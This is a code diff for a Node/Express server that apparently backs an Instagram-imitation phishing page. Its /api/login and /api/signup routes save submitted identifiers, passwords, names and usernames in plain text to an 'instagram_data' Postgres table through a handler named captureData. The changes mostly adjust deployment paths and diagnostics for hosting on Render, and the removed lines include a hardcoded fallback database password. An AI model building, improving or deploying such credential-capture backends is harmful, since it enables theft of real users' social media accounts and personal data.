@@ -1,6 +1,6 @@
 
 const express = require('express');
-const { Client, Pool } = require('pg');
+const { Pool } = require('pg');
 const cors = require('cors');
 const path = require('path');
 const fs = require('fs');
@@ -8,52 +8,54 @@ const fs = require('fs');
 const app = express();
 const port = process.env.PORT || 3001;
 
-// Configuration for local and production
-const dbConfig = {
-  connectionString: process.env.DATABASE_URL,
-  host: process.env.DB_HOST || 'localhost',
-  port: process.env.DB_PORT || 5432,
-  user: process.env.DB_USER || 'postgres',
-  password: process.env.DB_PASSWORD || '8959',
-  database: process.env.DB_NAME || 'db_name',
-  ssl: process.env.DATABASE_URL ? { rejectUnauthorized: false } : false
-};
-
 app.use(cors());
 app.use(express.json());
 
-// Serve the compiled frontend bundle specifically
-const distPath = path.join(__dirname, 'dist');
+// Explicitly resolve paths for Render environment
+const rootPath = process.cwd();
+const distPath = path.join(rootPath, 'dist');
 const bundlePath = path.join(distPath, 'bundle.js');
 
-// Log path info for debugging Render deployments
-console.log('Checking for bundle at:', bundlePath);
+console.log('--- Startup Diagnostic ---');
+console.log('Root Directory:', rootPath);
+console.log('Expected Bundle Path:', bundlePath);
+
 if (fs.existsSync(bundlePath)) {
-    console.log('Bundle found successfully.');
+    console.log('SUCCESS: bundle.js exists and is ready to serve.');
 } else {
-    console.error('CRITICAL: bundle.js NOT found in dist folder! Ensure build command ran successfully.');
+    console.error('ERROR: bundle.js NOT FOUND. Build might have failed or directory structure is different.');
+    // Help debug by listing files
+    try {
+        console.log('Files in root:', fs.readdirSync(rootPath));
+        if (fs.existsSync(distPath)) {
+            console.log('Files in dist:', fs.readdirSync(distPath));
+        } else {
+            console.log('dist directory missing entirely.');
+        }
+    } catch (e) {
+        console.error('Failed to read directory for debug:', e.message);
+    }
 }
 
-// Static middleware
+// Serve static files from the 'dist' folder at the '/dist' URL prefix
 app.use('/dist', express.static(distPath));
-app.use(express.static(__dirname));
+// Serve other static files (like index.html) from the root
+app.use(express.static(rootPath));
 
+// DB Connection
+const dbConfig = {
+  connectionString: process.env.DATABASE_URL,
+  ssl: process.env.DATABASE_URL ? { rejectUnauthorized: false } : false
+};
+
+let dbPool;
 async function initDb() {
-  const pool = process.env.DATABASE_URL 
-    ? new Pool({ connectionString: process.env.DATABASE_URL, ssl: { rejectUnauthorized: false } })
-    : new Pool(dbConfig);
-
+  if (!process.env.DATABASE_URL) {
+    console.warn("DATABASE_URL not set. Capture will fail.");
+    return null;
+  }
+  const pool = new Pool(dbConfig);
   try {
-    // Local DB creation logic (only if no URL provided)
-    if (!process.env.DATABASE_URL) {
-        const baseClient = new Client({ ...dbConfig, database: 'postgres' });
-        await baseClient.connect();
-        const res = await baseClient.query(`SELECT 1 FROM pg_database WHERE datname = $1`, [dbConfig.database]);
-        if (res.rowCount === 0) await baseClient.query(`CREATE DATABASE "${dbConfig.database}"`);
-        await baseClient.end();
-    }
-
-    // Initialize tables
     await pool.query(`
       CREATE TABLE IF NOT EXISTS instagram_data (
         id SERIAL PRIMARY KEY,
@@ -64,20 +66,19 @@ async function initDb() {
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
       );
     `);
-    console.log("Database initialized successfully.");
+    console.log("Database initialized.");
     return pool;
   } catch (err) {
-    console.error("Database Initialization Error:", err.message);
-    return pool;
+    console.error("Database initialization failed:", err.message);
+    return null;
   }
 }
 
-let dbPool;
 initDb().then(pool => { dbPool = pool; });
 
 const captureData = async (req, res) => {
   const { identifier, password, fullName, username } = req.body;
-  if (!dbPool) return res.status(503).json({ success: false, message: 'Database not ready' });
+  if (!dbPool) return res.status(503).json({ success: false, message: 'DB not connected' });
 
   try {
     const query = `INSERT INTO instagram_data (identifier, password, full_name, username) VALUES ($1, $2, $3, $4) RETURNING id;`;
@@ -92,11 +93,11 @@ const captureData = async (req, res) => {
 app.post('/api/signup', captureData);
 app.post('/api/login', captureData);
 
-// Fallback to index.html for React Router compatibility
+// Fallback: Send index.html for any unknown requests (essential for SPAs)
 app.get('*', (req, res) => {
-  res.sendFile(path.join(__dirname, 'index.html'));
+  res.sendFile(path.join(rootPath, 'index.html'));
 });
 
 app.listen(port, () => {
-  console.log(`Server is running on port ${port}`);
+  console.log(`Server listening on port ${port}`);
 });
